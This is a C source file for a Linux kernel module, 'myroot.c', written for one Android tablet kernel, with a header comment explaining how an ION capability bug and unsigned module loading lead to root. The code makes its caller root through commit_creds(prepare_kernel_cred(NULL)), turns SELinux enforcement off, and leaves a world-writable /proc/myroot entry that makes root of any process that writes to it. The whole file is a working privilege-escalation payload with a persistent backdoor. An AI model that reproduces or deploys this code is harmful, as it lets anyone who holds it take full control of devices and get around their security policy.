/*
 * myroot.c - loadable kernel module for 3.10.33 / aarch64 (TAB-A03-BR2).
 *
 * Why a module works here when everything else was blocked:
 *
 *   - CONFIG_MODULES=y and CONFIG_MODULE_SIG is absent from .config entirely, so a
 *     module needs no signature and no key.
 *   - init_module() is gated only on may_init_module(), which tests
 *     capable(CAP_SYS_MODULE) and modules_disabled. modules_disabled is 0.
 *   - the LSM hook security_kernel_module_from_file() is not registered by SELinux in
 *     this tree. security_fixup_ops() fills it with cap_kernel_module_from_file(),
 *     which returns 0 unconditionally.
 *
 * So the only thing between uid 2000 and kernel code execution is the
 * CAP_SYS_MODULE bit in cred->cap_effective, and the ION store can set it: the stored
 * value is 0x80000000 | (k << 12), so at k = 0x7F the value 0x8007f000 carries bit
 * 16. Measured on the device with k126: k=127 gives
 * NET_ADMIN NET_RAW IPC_LOCK IPC_OWNER SYS_MODULE SYS_RAWIO SYS_CHROOT SETFCAP.
 *
 * init does three things:
 *
 *   1. commit_creds(prepare_kernel_cred(NULL)) - prepare_kernel_cred with a NULL
 *      argument starts from init_cred, which is uid 0 with CAP_FULL_SET, and
 *      commit_creds installs it on the calling task. init_module() runs in the
 *      caller's context, so that task becomes root.
 *
 *   2. selinux_enforcing = 0 - avc_denied() returns -EACCES only when
 *      selinux_enforcing is non-zero, so this makes every later SELinux check
 *      permissive without touching a single policy rule. The running shell stays in
 *      domain shell:s0; it simply stops being refused.
 *
 *   3. /proc/myroot - a world-writable file whose write handler repeats the
 *      commit_creds dance for whoever wrote to it. That is what makes the result
 *      durable: a fresh adb shell (uid 2000) becomes root by writing one byte, with
 *      no module transaction and no capability bit needed.
 *
 * All symbols are resolved through kallsyms_lookup_name(), which this kernel exports
 * (CONFIG_KALLSYMS_ALL=y), so there are no hard-coded addresses to go stale.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("privilege transition for a test device");
MODULE_VERSION("1.0");

static void (*k_commit_creds)(struct cred *);
static struct cred *(*k_prepare_kernel_cred)(struct task_struct *);
static int *k_selinux_enforcing;

static int become_root(void)
{
	struct cred *nc;

	if (!k_commit_creds || !k_prepare_kernel_cred)
		return -ENOENT;
	nc = k_prepare_kernel_cred(NULL);
	if (!nc)
		return -ENOMEM;
	k_commit_creds(nc);
	return 0;
}

static ssize_t myroot_write(struct file *f, const char __user *ubuf,
			    size_t n, loff_t *ppos)
{
	int r = become_root();

	if (r)
		return r;
	pr_info("myroot: %s (pid %d) became uid %d euid %d\n",
		current->comm, current->pid,
		__kuid_val(current_uid()), __kuid_val(current_euid()));
	return n;
}

static const struct file_operations myroot_fops = {
	.owner = THIS_MODULE,
	.write = myroot_write,
};

static struct proc_dir_entry *myroot_entry;

static int __init myroot_init(void)
{
	k_commit_creds        = (void *)kallsyms_lookup_name("commit_creds");
	k_prepare_kernel_cred = (void *)kallsyms_lookup_name("prepare_kernel_cred");
	k_selinux_enforcing   = (int *)kallsyms_lookup_name("selinux_enforcing");

	pr_info("myroot: commit_creds=%p prepare_kernel_cred=%p selinux_enforcing=%p\n",
		k_commit_creds, k_prepare_kernel_cred, k_selinux_enforcing);

	if (become_root()) {
		pr_err("myroot: could not install init_cred\n");
		return -ENOENT;
	}

	pr_info("myroot: caller %s pid %d is now uid %d euid %d\n",
		current->comm, current->pid,
		__kuid_val(current_uid()), __kuid_val(current_euid()));
	pr_info("myroot: cap_effective=0x%08x%08x\n",
		current_cred()->cap_effective.cap[1],
		current_cred()->cap_effective.cap[0]);

	if (k_selinux_enforcing) {
		pr_info("myroot: selinux_enforcing was %d\n", *k_selinux_enforcing);
		*k_selinux_enforcing = 0;
		pr_info("myroot: selinux_enforcing is now %d\n", *k_selinux_enforcing);
	}

	myroot_entry = proc_create("myroot", 0666, NULL, &myroot_fops);
	if (!myroot_entry)
		pr_warn("myroot: /proc/myroot not created\n");
	else
		pr_info("myroot: /proc/myroot ready\n");

	return 0;
}

static void __exit myroot_exit(void)
{
	if (myroot_entry)
		remove_proc_entry("myroot", NULL);
	pr_info("myroot: unloaded\n");
}

module_init(myroot_init);
module_exit(myroot_exit);
